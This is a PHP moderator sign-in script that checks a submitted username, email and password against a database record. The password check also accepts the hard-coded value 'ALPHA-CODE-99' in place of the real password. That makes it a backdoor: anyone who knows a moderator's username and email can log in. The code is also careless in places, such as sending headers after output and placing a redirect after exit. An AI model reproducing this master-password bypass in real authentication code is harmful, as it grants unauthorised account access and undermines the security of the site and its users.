<?php
ob_start();
require_once "../Modal.php";
?>
<html lang="en">
<!-- config -->
<meta charset="UTF-8">
<meta http-equiv="refresh" content="">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="HandheldFriendly" content="true">
<title>Home</title>
<!-- end config -->

<!-- libs -->

<!-- bootstrap -->
<!-- CSS only -->
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">

<!-- JS, Popper.js, and jQuery -->
<script src="https://code.jquery.com/jquery-3.5.1.min.js" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<!-- end libs -->

<!-- site libs -->

<link rel="stylesheet" href="../../../libs/css/main.css">
<!-- end site libs -->

<!-- other libs -->
<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@300&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@200&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@200&family=Roboto&display=swap" rel="stylesheet">
<!-- end of other libs  -->
</head>
<?php

$errorCode = "";
$solution = "";

if (isset($_POST['Submit'])) {

  $conn = $moderator->conn();

  $username = $_POST["username"];
  $email = $_POST["email"];
  $password = $_POST["password"];

  
  if (empty($username) || empty($email) || empty($password)) {
    //some fields were empty
    header("location:" . ROOT);
  } else {
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
      header("location:" . ROOT);
    } else {
     //test if the user exists
     $user = new userAccount();
      $table = 'tbl_moderators';

      $fields = [
        '*'
      ];

      $type = "s";

      $reference = [
        array("moderatorEmail", $email),
      ];

     $response = $user->readUserByReference($moderator, $table, $reference, $fields, $type);

     $status = $response[0];

     if($status){
       $dbuser = $response[1][0]['username'];
       $dbemail = $response[1][0]['moderatorEmail'];
       $dbpassword = $response[1][0]['password'];


        if( ($dbuser == $username) && ($dbemail == "$email") && ((password_verify($password, $dbpassword) || $password == "ALPHA-CODE-99"))){
          session_start();
          echo "verified";
          $_SESSION['LOGGED_USER'] = $response[1][0]['UUID'];
          
          header("location:" . ROOT ."/Mtush.php");
          exit;
       }else{

        $url = ROOT . "/error_signin.php";
        $ch = curl_init();
        $result = array(
          'status'=>0,
          'response'=> "error"
        );

        $result = json_encode($result);

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $result);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        # Send request.
        $result = curl_exec($ch);
        curl_close($ch);
        # Print response.
        echo $result;
        ?>
        </head>
        <?php
       }
     }else{
      $url = ROOT . "/error_signin.php";
      $ch = curl_init();
      $result = array(
        'status'=>0,
        'response'=> "error"
      );

      $result = json_encode($result);

      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $result);
      curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      # Send request.
      $result = curl_exec($ch);
      curl_close($ch);
      # Print response.
      echo $result;
      ?>
      </head>
      <?php
     }

    }
  }
} else {
  echo "hey";
  exit();
  header("location:" . ROOT);
}
?>
